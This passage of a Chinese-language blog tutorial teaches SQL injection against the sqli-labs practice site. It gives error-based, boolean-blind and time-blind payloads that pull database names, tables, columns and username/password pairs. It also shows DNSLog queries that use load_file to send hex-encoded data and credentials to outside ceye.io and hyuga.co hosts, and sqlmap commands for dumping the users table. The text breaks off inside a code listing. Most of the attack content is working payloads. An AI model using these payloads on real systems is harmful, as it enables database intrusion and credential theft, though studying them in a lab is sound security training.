<h2 id="Hackbar-Payload"><a href="#Hackbar-Payload" class="headerlink" title="Hackbar Payload"></a>Hackbar Payload</h2><p>报错注入比较简单粗暴，无需构造 Union select 语句了，直接闭合/注释掉 SQL 语句即可注入查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># version</span><br><span class="line">+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1</span><br><span class="line"></span><br><span class="line"># database</span><br><span class="line">+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># tables</span><br><span class="line">+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># columns</span><br><span class="line">+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x7573657273+AND+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br><span class="line"></span><br><span class="line"># data</span><br><span class="line">+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)</span><br></pre></td></tr></table></figure>
<p>手动进行数据偏移来查询下一条数据：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT+0,1</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/image-20200510172820746.png" alt="image-20200510172820746"></p>
<h1 id="布尔类型盲注"><a href="#布尔类型盲注" class="headerlink" title="布尔类型盲注"></a>布尔类型盲注</h1><h2 id="盲注的概念"><a href="#盲注的概念" class="headerlink" title="盲注的概念"></a>盲注的概念</h2><p>页面无法进行显示 SQL 查询的数据，导致之前使用的显错注入就无法成功注入。</p>
<p>盲注就是在 SQL 注入过程中，SQL 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p>
<h2 id="盲注的原理"><a href="#盲注的原理" class="headerlink" title="盲注的原理"></a>盲注的原理</h2><p><strong>获取数据库长度</strong></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># security 8位</span></span><br><span class="line">and length(database())&gt;7</span><br><span class="line">and length(database())&gt;8</span><br></pre></td></tr></table></figure>
<p><strong>LEFT函数</strong></p>
<p><code>LEFT(s,n)</code>返回字符串 s 的前 n 个字符</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第1位</span></span><br><span class="line">left(database(),1)&gt;'a';</span><br><span class="line">left(database(),1)&gt;'z';</span><br><span class="line">left(database(),1)&gt;'e';</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2位</span></span><br><span class="line">left(database(),2)&gt;'sa';</span><br><span class="line">left(database(),2)&gt;'sz';</span><br><span class="line">left(database(),2)&gt;'se';</span><br></pre></td></tr></table></figure>
<p><strong>MID函数</strong></p>
<p><code>MID(s,n,len)</code>从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第1位</span></span><br><span class="line">and mid(user(),1,1)&gt;'a' ;</span><br><span class="line">and mid(user(),1,1)&gt;'z' ;</span><br><span class="line">and mid(user(),1,1)&gt;'q' ;</span><br><span class="line">and mid(user(),1,1)&gt;'r' ;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第2位</span></span><br><span class="line">and mid(user(),1,2)&gt;'rn' ;</span><br><span class="line">and mid(user(),1,2)&gt;'ro' ;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者这样</span></span><br><span class="line">and mid(user(),2,1)&gt;'n'</span><br><span class="line">and mid(user(),2,1)&gt;'0'</span><br></pre></td></tr></table></figure>
<p><strong>SUBSTR函数</strong></p>
<p><code>SUBSTR(s, start, length)</code>从字符串 s 的 start 位置截取长度为 length 的子字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and substr(version(),1,1)&gt;4;</span><br><span class="line">and substr(version(),1,1)&gt;5;</span><br></pre></td></tr></table></figure>
<p><strong>ASCII</strong></p>
<p><code>ASCII(s)</code>返回字符串 s 的第一个字符的 ASCII 码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and ascii(user())&gt;113 ;</span><br><span class="line">and ascii(user())&gt;114 ;</span><br><span class="line"></span><br><span class="line">and ascii(mid(user(),1,1))&gt;113 ;</span><br><span class="line">and ascii(mid(user(),1,1))&gt;114 ;</span><br></pre></td></tr></table></figure>
<p><strong>ORD</strong></p>
<p><code>ORD()</code>函数返回字符串第一个字符的 ASCII值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid((select username from security.users order by id limit 0,1),1,1))=68</span><br></pre></td></tr></table></figure>
<p><strong>IF与REGEXP与LIKE</strong></p>
<p><code>IF(expr,v1,v2)</code>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 判断用户名</span><br><span class="line">and 1=(if((user() regexp &apos;^ro&apos;),1,0));</span><br><span class="line"></span><br><span class="line"># 查表名</span><br><span class="line">and 1=(select 1 from information_schema.tables where table_schema=&apos;security&apos; and table_name regexp &apos;^us[a-z]&apos; limit 0,1);</span><br><span class="line"></span><br><span class="line"># 查列名</span><br><span class="line">and 1=(select 1 from information_schema.columns where table_name=&apos;users&apos; and column_name regexp &apos;^us[a-z]&apos; limit 0,1);</span><br><span class="line"></span><br><span class="line"># 查内容</span><br><span class="line">and ord(mid((select username from security.users order by id limit 0,1),1,1))=68</span><br><span class="line">mysql&gt; select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| ifnull(cast(username as char),0x20) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| Dumb                                |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure>
<p><strong>CAST函数</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cast(字段名 as 转换的类型 )</span><br></pre></td></tr></table></figure>
<p><code>CAST()</code>函数将任何类型的值转换为具有指定类型的值。目标类型可以是以下类型之一：</p>
<p><code>BINARY</code>，<code>CHAR</code>，<code>DATE</code>，<code>DATETIME</code>，<code>TIME</code>，<code>DECIMAL</code>，<code>SIGNED</code>，<code>UNSIGNED</code>。</p>
<p>该函数通常用于返回具有指定类型的值</p>
<p><strong>IFNULL</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(expr1,expr2)</span><br></pre></td></tr></table></figure>
<p>如果 expr1 不是NULL，IFNULL() 返回 expr1，否则它返回 expr2</p>
<h1 id="基于时间类型盲注"><a href="#基于时间类型盲注" class="headerlink" title="基于时间类型盲注"></a>基于时间类型盲注</h1><h2 id="SLEEP-tiem"><a href="#SLEEP-tiem" class="headerlink" title="SLEEP(tiem)"></a>SLEEP(tiem)</h2><p>依然是配合字符串截取函数使用，用来作为延时的条件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当前数据库第一位 s 的 ascii 码</span></span><br><span class="line">mysql&gt; select ascii(database());</span><br><span class="line">+-------------------+</span><br><span class="line">| ascii(database()) |</span><br><span class="line">+-------------------+</span><br><span class="line">|               115 |</span><br><span class="line">+-------------------+</span><br><span class="line"></span><br><span class="line">and 1=<span class="keyword">if</span>(ascii(substr(database(),1,1))&gt;115,1,sleep(5))</span><br></pre></td></tr></table></figure>
<p>相当于原来的 and 判断现在直接使用是否触发<code>sleep()</code>函数来判断是否产生了注入。</p>
<h2 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h2><p>用于基准测试函数的性能，参数一为运算次数数，参数二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。</p>
<p>这是一种边信道攻击，在运行过程中占用大量的 cpu 资源，而且比较主观。推荐使用 sleep() 函数进行注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=if(ascii(substr(database(),1,1))&gt;115,1,BENCHMARK(10000000000,md5(233)))</span><br></pre></td></tr></table></figure>
<h1 id="DNSLog外带数据"><a href="#DNSLog外带数据" class="headerlink" title="DNSLog外带数据"></a>DNSLog外带数据</h1><p>DNSLog 在 Web 漏洞利用中已经是老生常谈的问题，简单理解就是在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以通过这种方式把想获得的数据外带出来。</p>
<h2 id="DNSLog-平台地址"><a href="#DNSLog-平台地址" class="headerlink" title="DNSLog 平台地址"></a>DNSLog 平台地址</h2><h3 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h3><p><strong>项目地址</strong>：<a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></p>
<p><strong>在线演示地址</strong>：<a href="https://admin.dnslog.link/" target="_blank" rel="noopener">https://admin.dnslog.link/</a> test/123456</p>
<p><img src="http://qiniuyun.lintstar.top/image-20200510195616110.png" alt="image-20200510195616110"></p>
<h3 id="ceye"><a href="#ceye" class="headerlink" title="ceye"></a>ceye</h3><p><strong>官网地址</strong>：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></p>
<h3 id="Hyuga"><a href="#Hyuga" class="headerlink" title="Hyuga"></a>Hyuga</h3><p><strong>项目地址</strong>：<a href="https://github.com/Buzz2d0/Hyuga" target="_blank" rel="noopener">https://github.com/Buzz2d0/Hyuga</a></p>
<p><strong>演示地址</strong>：<a href="http://hyuga.co/" target="_blank" rel="noopener">http://hyuga.co</a></p>
<h2 id="开启-load-file"><a href="#开启-load-file" class="headerlink" title="开启 load_file()"></a>开启 load_file()</h2><p>因为 dnslog 盲注需要使用 <code>load_file()</code> 函数，所以一般得是高权限用户。sql 语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure>
<p>查看 load_file() 可以读取的磁盘，若不可用，则修改 my.ini 配置文件</p>
<ul>
<li>当 secure_file_priv 为 空，表示不对mysqld 的导入|导出做限制，就可以读取磁盘的目录</li>
<li>当 secure_file_priv 为 C:\，就可以读取C盘的文件</li>
<li>当 secure_file_priv 为 null，表示限制 mysqld 不允许导入/导出</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%secure%'</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
<p>修改<strong>mysql.ini</strong> 文件，在<strong>[mysqld]</strong> 下加入:</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span> =</span><br></pre></td></tr></table></figure>
<p>修改完重启 MySQL 服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">'%secure%'</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br></pre></td></tr></table></figure>
<h2 id="详细演示"><a href="#详细演示" class="headerlink" title="详细演示"></a>详细演示</h2><p><strong>查询当前数据库名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hex编码</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">database</span>())),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyuga</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">if</span>((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">database</span>())),<span class="string">'.c3ini5.hyuga.co\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这个地方Hex编码的目的就是减少干扰，因为很多事数据库字段的值可能是有特殊符号的，这些特殊符号拼接在域名里是无法做dns查询的，因为域名是有一定的规范，有些特殊符号是不能带入的。</p>
<p><strong>查询第1个表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><strong>查询第1个字段名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><strong>查询单个列的数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(username) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><strong>查询多个列的数据</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="keyword">concat</span>(<span class="string">'\\\\'</span>,(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">concat_ws</span>(<span class="string">'~'</span>,username,<span class="keyword">password</span>)) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.gvc791.ceye.io\\abc'</span>))),<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h1 id="SQLMap基础"><a href="#SQLMap基础" class="headerlink" title="SQLMap基础"></a>SQLMap基础</h1><h2 id="SQLMap-简介"><a href="#SQLMap-简介" class="headerlink" title="SQLMap 简介"></a>SQLMap 简介</h2><p>sqlmap 是一款自动化检测与利用 SQL 注入漏洞的免费开源工具。</p>
<ul>
<li>完全支持 <strong>MySQL</strong>，<strong>Oracle</strong>，<strong>PostgresSQL</strong>，<strong>Microsoft SQL Server</strong>，<strong>Microsoft Access</strong>，<strong>IBM DB2</strong>，<strong>SQLite</strong>，<strong>Firebird</strong>，<strong>Sybase</strong>，<strong>SAP MaxDB</strong> 和 <strong>HSQLDB</strong> 数据库管理系统。</li>
<li>完全支持4种 SQL 注入技术：<strong>布尔型盲注</strong>，<strong>时间型盲注</strong>，<strong>报错型注入</strong>，<strong>UNION 查询注入</strong></li>
<li>可以测试并利用 <strong>GET</strong> 和 <strong>POST</strong> 参数，HTTP 头中的 <strong>Cookie</strong>，<strong>User-Agent</strong> 和 <strong>Referer</strong> 这些地方出现的 SQL 注入漏洞。也可以指定一个用英文逗号隔开的参数列表进行测试。</li>
<li><strong>HTTP(S)</strong> 代理支持通过使用验证代理服务器对目标应用发起请求，同时支持 HTTPS 请求</li>
<li>支持设置<strong>输出信息的详细级别</strong>：共有<strong>七个级别</strong>的详细程度。</li>
<li>支持从目标 URL 中<strong>解析 HTML 表单</strong>并伪造 HTTP(S) 请求以测试这些表单参数是否存在漏洞。</li>
<li>…</li>
</ul>
<h2 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h2><ul>
<li>官网：<a href="http://sqlmap.org/" target="_blank" rel="noopener">http://sqlmap.org/</a></li>
<li>项目地址: <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></li>
</ul>
<h2 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h2><p><strong>检测是否存在 SQL 注入</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span></span><br></pre></td></tr></table></figure>
<p><strong>查看基本信息</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前数据库</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --current-user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库 banner 信息</span></span><br><span class="line"> -u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -b</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取主机名</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测当前用户是否是高权限用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --is-dba</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有用户</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --users</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有所有数据库</span></span><br><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure>
<p><strong>查看当前数据库下的表信息</strong></p>
<p>开关：<code>--count</code></p>
<p>如果用户想要在导出所需表数据之前知道表中的条目数，可以使用此开关。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>枚举表名下的列信息</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> -T <span class="string">'users'</span> --columns</span><br></pre></td></tr></table></figure>
<p><strong>查询 users 表下所有 username和 password 列的字段信息</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u <span class="string">"http://10.211.55.6/sqli-labs/Less-1/?id=1"</span> -D <span class="string">'security'</span> -T <span class="string">'users'</span> -C <span class="string">'username,password'</span> --dump</span><br></pre></td></tr></table></figure>
<p><img src="http://qiniuyun.lintstar.top/image-20200510213353530.png" alt="image-20200510213353530"></p>
<h2 id="详细用法"><a href="#详细用法" class="headerlink" title="详细用法"></a>详细用法</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span 